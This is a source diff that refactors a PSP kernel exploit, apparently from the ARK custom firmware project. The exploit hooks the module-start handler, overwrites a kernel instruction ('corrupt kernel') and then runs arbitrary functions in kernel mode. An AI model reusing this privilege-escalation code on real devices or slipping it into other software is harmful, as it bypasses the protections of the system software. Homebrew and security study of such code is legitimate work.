@@ -33,36 +33,31 @@
 #include "functions.h"
 #include "kxploit.h"
 
-#include "common/utils/scanner.c"
-
 /*
 Kernel exploit to use when ARK.BIN is already loaded within a Custom Firmware.
 */
 
-UserFunctions* g_tbl = NULL;
+static void* (*set_start_module_handler)(void*) = NULL;
+static int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;
+static void (*prev)(void*) = NULL;
 
-void* (*set_start_module_handler)(void*) = NULL;
-int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;
-void (*prev)(void*) = NULL;
+static u32 patch_instr = 0;
+static u32 patch_addr = 0;
 
-u32 patch_instr = 0;
-u32 patch_addr = 0;
-
-int stubScanner(UserFunctions* tbl){
-    g_tbl = tbl;
+int stubScannerCFW(UserFunctions* tbl){
     set_start_module_handler = tbl->FindImportUserRam("SystemCtrlForUser", 0x1C90BECB); // weak import in ARK Live
     _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);
     return (set_start_module_handler == NULL || _sceKernelLibcTime == NULL);
 }
 
-void repairInstruction(KernelFunctions* k_tbl){
+void repairInstructionCFW(KernelFunctions* k_tbl){
     if (patch_addr && patch_instr){
         // restore
         _sw(patch_instr, patch_addr);
     }
 }
 
-void my_mod_handler(void* mod){
+static void my_mod_handler(void* mod){
 
     // corrupt kernel
     u32 libctime = (void*)FindFunction("sceSystemMemoryManager", "UtilsForUser", 0x27CC57F0);
@@ -77,13 +72,14 @@ void my_mod_handler(void* mod){
     set_start_module_handler(prev);
 }
 
-int doExploit(void){
+int doExploitCFW(void){
     prev = set_start_module_handler(my_mod_handler); // register our custom handler
     g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON); // trigger StartModule handler
     g_tbl->UtilityUnloadModule(PSP_MODULE_NP_COMMON);
+    g_tbl->KernelDcacheWritebackAll();
     return (patch_addr == 0 || patch_instr == 0);
 }
 
-void executeKernel(u32 kfuncaddr){
+void executeKernelCFW(u32 kfuncaddr){
     _sceKernelLibcTime(0x08800000, KERNELIFY(kfuncaddr));
 }
